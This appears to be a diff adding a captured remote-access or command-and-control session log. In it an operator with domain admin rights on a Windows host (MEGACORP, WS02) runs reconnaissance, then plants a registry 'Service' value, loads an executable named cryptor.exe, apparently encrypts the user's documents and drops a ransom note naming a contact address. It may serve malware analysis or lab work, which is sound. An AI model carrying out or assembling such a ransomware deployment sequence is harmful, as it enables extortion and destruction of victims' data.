@@ -1,0 +1,160 @@
+----------------------
+yOaw1fs6
+----------------------
+rc
+----------------------
+whoami
+----------------------
+megacorp\rashley
+----------------------
+rc
+----------------------
+whoami /groups
+----------------------
+GROUP INFORMATION
+-----------------
+
+Group Name                                      Type             SID                                           Attributes                                                     
+=============================================== ================ ============================================= ===============================================================
+Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\INTERACTIVE                        Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group             
+CONSOLE LOGON                                   Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group             
+LOCAL                                           Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group             
+MEGACORP\Domain Admins                          Group            S-1-5-21-2568767272-3650002656-3939649453-512 Mandatory group, Enabled by default, Enabled group             
+Authentication authority asserted identity      Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group             
+MEGACORP\Denied RODC Password Replication Group Alias            S-1-5-21-2568767272-3650002656-3939649453-572 Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\High Mandatory Level            Label            S-1-16-12288
+----------------------
+rc
+----------------------
+hostname
+----------------------
+WS02
+----------------------
+rc
+----------------------
+powershell Get-ADDomain
+----------------------
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=MEGACORP,DC=LOCAL
+DeletedObjectsContainer            : CN=Deleted Objects,DC=MEGACORP,DC=LOCAL
+DistinguishedName                  : DC=MEGACORP,DC=LOCAL
+DNSRoot                            : MEGACORP.LOCAL
+DomainControllersContainer         : OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-2568767272-3650002656-3939649453
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=MEGACORP,DC=LOCAL
+Forest                             : MEGACORP.LOCAL
+InfrastructureMaster               : WS02.MEGACORP.LOCAL
+LastLogonReplicationInterval       : 
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=MEGACORP,DC=LO
+                                     CAL}
+LostAndFoundContainer              : CN=LostAndFound,DC=MEGACORP,DC=LOCAL
+ManagedBy                          : 
+Name                               : MEGACORP
+NetBIOSName                        : MEGACORP
+ObjectClass                        : domainDNS
+ObjectGUID                         : b1adbda3-eb9a-4be3-8627-819232d17938
+ParentDomain                       : 
+PDCEmulator                        : WS02.MEGACORP.LOCAL
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=MEGACORP,DC=LOCAL
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {WS02.MEGACORP.LOCAL}
+RIDMaster                          : WS02.MEGACORP.LOCAL
+SubordinateReferences              : {DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL, DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL, 
+                                     CN=Configuration,DC=MEGACORP,DC=LOCAL}
+SystemsContainer                   : CN=System,DC=MEGACORP,DC=LOCAL
+UsersContainer                     : CN=Users,DC=MEGACORP,DC=LOCAL
+----------------------
+rc
+----------------------
+setspn -L WS02
+----------------------
+Registered ServicePrincipalNames for CN=WS02,OU=Domain Controllers,DC=MEGACORP,DC=LOCAL:
+    Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WS02.MEGACORP.LOCAL
+    ldap/WS02.MEGACORP.LOCAL/ForestDnsZones.MEGACORP.LOCAL
+    ldap/WS02.MEGACORP.LOCAL/DomainDnsZones.MEGACORP.LOCAL
+    DNS/WS02.MEGACORP.LOCAL
+    GC/WS02.MEGACORP.LOCAL/MEGACORP.LOCAL
+    RestrictedKrbHost/WS02.MEGACORP.LOCAL
+    RestrictedKrbHost/WS02
+    RPC/227edde9-d608-4432-b00a-a5d25595d1ac._msdcs.MEGACORP.LOCAL
+    HOST/WS02/MEGACORP
+    HOST/WS02.MEGACORP.LOCAL/MEGACORP
+    HOST/WS02
+    HOST/WS02.MEGACORP.LOCAL
+    HOST/WS02.MEGACORP.LOCAL/MEGACORP.LOCAL
+    E3514235-4B06-11D1-AB04-00C04FC2DCD2/227edde9-d608-4432-b00a-a5d25595d1ac/MEGACORP.LOCAL
+    ldap/WS02/MEGACORP
+    ldap/227edde9-d608-4432-b00a-a5d25595d1ac._msdcs.MEGACORP.LOCAL
+    ldap/WS02.MEGACORP.LOCAL/MEGACORP
+    ldap/WS02
+    ldap/WS02.MEGACORP.LOCAL
+    ldap/WS02.MEGACORP.LOCAL/MEGACORP.LOCAL
+----------------------
+rc
+----------------------
+dir C:\Users\RAshley\Documents
+----------------------
+Volume in drive C has no label.
+ Volume Serial Number is 363A-11A5
+
+ Directory of C:\Users\RAshley\Documents
+
+07/06/2021  04:33 PM    <DIR>          .
+07/06/2021  04:33 PM    <DIR>          ..
+07/06/2021  01:24 PM            33,364 Confidential.pdf
+07/06/2021  04:26 PM    <DIR>          Invoice
+07/06/2021  04:26 PM    <DIR>          Receipt
+               1 File(s)         33,364 bytes
+               4 Dir(s)  45,392,068,608 bytes free
+----------------------
+wr
+----------------------
+Service
+----------------------
+mmgb4UNqb3JWGZm7n7Gt9kTtBm6w9pbVWuah
+----------------------
+ok
+----------------------
+la
+----------------------
+[Exe saved in cryptor.exe]
+----------------------
+ok
+----------------------
+rc
+----------------------
+dir C:\Users\RAshley\Desktop
+----------------------
+Volume in drive C has no label.
+ Volume Serial Number is 363A-11A5
+
+ Directory of C:\Users\RAshley\Desktop
+
+07/06/2021  04:34 PM    <DIR>          .
+07/06/2021  04:34 PM    <DIR>          ..
+07/06/2021  04:34 PM            33,749 your_documents
+               1 File(s)         33,749 bytes
+               2 Dir(s)  45,390,848,000 bytes free
+----------------------
+rr
+----------------------
+UpdateKey
+----------------------
+d31dd518-8614-4162-beae-7a5a2ad86cc6
+----------------------
+wf
+----------------------
+C:\Users\RAshley\Desktop\note.txt
+----------------------
+All your files have been encrypted. Contact me at gh0st@l33th4cks.co to obtain information on how to unlock them.
+----------------------
+ok
